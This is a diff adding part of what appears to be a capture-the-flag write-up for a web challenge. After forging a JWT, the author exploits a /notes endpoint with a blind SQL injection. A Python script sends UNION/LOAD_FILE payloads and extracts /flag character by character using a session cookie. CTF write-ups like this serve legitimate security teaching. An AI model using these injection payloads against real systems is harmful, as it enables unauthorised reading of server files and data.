@@ -42,3 +42,30 @@ print("JWT Token:", token)
 ```
 
 after sending this JWT to /get_creds we recieve the user credentials so we have the admin password
+
+Now in /notes endpoint, we have a possible sql vuln
+![image](https://github.com/user-attachments/assets/d97513a2-22eb-4e1c-ade9-271baa89d027)
+
+SQL script used
+```
+import requests
+import urllib.parse
+
+confirmed_flag = "" # the flag found so far 
+url = "http://web1.securinets.tn/notes?search="
+alphas = "abcdefghijklmnopqrstuvwxyz1234567890{}" #possible_chars
+cookies = {"session":"28d1de0946822fb5_670afeb6.d0K5YwPnOxymhhshUUDPn7Lfqr0"}
+
+while True:
+    for alpha in alphas:
+        payload = f"%' AND 1=2 UNION SELECT 1,2,3 FROM(SELECT LOAD_FILE('/flag') AS content) AS subquery WHERE content LIKE '{confirmed_flag+alpha}%' ;#"
+        full_url = url+urllib.parse.quote_plus(payload) # url encode payload since it will be in the params
+		found = requests.get(full_url,cookies=cookies).text.count("<h3>") # each time we get a computer symbol it's inside an h3 tag
+        if found: 
+            confirmed_flag += alpha
+            break
+	print(confirmed_flag)
+```
+Why the script is needed:
+- In a blind SQL injection scenario, you don't get direct feedback from the server about the results of the query (i.e., you don't immediately see the contents of the file or database). Instead, you only get some kind of yes/no response based on your query.
+- The server may indicate whether your guess is correct by subtly altering its behavior. In this case, the server might return an HTML response containing an `<h3>` tag if your guess is correct.
